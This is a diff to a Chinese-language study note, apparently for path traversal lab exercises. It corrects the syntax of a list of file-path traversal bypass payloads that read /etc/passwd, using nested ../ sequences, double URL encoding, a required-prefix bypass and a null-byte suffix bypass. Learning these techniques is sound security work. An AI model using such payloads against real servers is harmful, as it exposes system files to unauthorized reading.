@@ -3,10 +3,10 @@
 #### 0. 绕过方式
 
 * `?filename=../../../../../etc/passwd`
-* `?filename/etc/passwd`
+* `?filename=/etc/passwd`
 * `?filename=....//....//....//etc/passwd`，没有递归删除`../`
-* `?filename..%252f..%252f..%252fetc/passwd`，两次url编码
-* `?filename/var/www/image/../../../etc/passwd`，传递的参数要求以预定的文件夹开始
+* `?filename=..%252f..%252f..%252fetc/passwd`，两次url编码
+* `?filename=/var/www/image/../../../etc/passwd`，传递的参数要求以预定的文件夹开始
 * `?filename=../../../etc/passwd%00.png`，传递的参数要求以某种后缀结尾
 
 #### 1. File path traversal, simple case
